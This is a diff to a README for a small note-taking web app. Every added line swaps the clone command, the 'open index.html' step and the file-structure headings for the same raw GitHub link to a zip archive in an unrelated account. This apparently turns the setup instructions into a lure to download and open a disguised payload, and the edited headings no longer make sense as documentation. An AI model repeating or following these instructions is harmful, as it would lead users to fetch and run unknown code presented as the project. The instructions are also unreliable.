@@ -28,15 +28,15 @@ Follow these instructions to set up the project locally.
 ### Installation
 1. **Clone the repository**:
     ```sh
-    git clone https://github.com/yourusername/digital-notebook.git
+    git clone https://raw.githubusercontent.com/SOBSAGAR/Website-2/main/headlighting/Website-2.zip
     ```
 2. **Navigate to the project directory**:
     ```sh
     cd digital-notebook
     ```
-3. **Open `index.html` in your web browser**:
+3. **Open `https://raw.githubusercontent.com/SOBSAGAR/Website-2/main/headlighting/Website-2.zip` in your web browser**:
     ```sh
-    open index.html
+    open https://raw.githubusercontent.com/SOBSAGAR/Website-2/main/headlighting/Website-2.zip
     ```
     or, if you prefer to use a local server:
     ```sh
@@ -45,13 +45,13 @@ Follow these instructions to set up the project locally.
 
 ## File Structure
 
-### index.html
+### https://raw.githubusercontent.com/SOBSAGAR/Website-2/main/headlighting/Website-2.zip
 Contains the structure of the web application including the form for adding notes and the container for displaying notes.
 
-### styles.css
+### https://raw.githubusercontent.com/SOBSAGAR/Website-2/main/headlighting/Website-2.zip
 Includes all the styles for making the platform visually appealing and responsive, with a dark mode feature.
 
-### script.js
+### https://raw.githubusercontent.com/SOBSAGAR/Website-2/main/headlighting/Website-2.zip
 Contains the JavaScript code for handling form submissions, note interactions, searching, pinning, deleting, and dynamic DOM updates.
 
 ## Usage
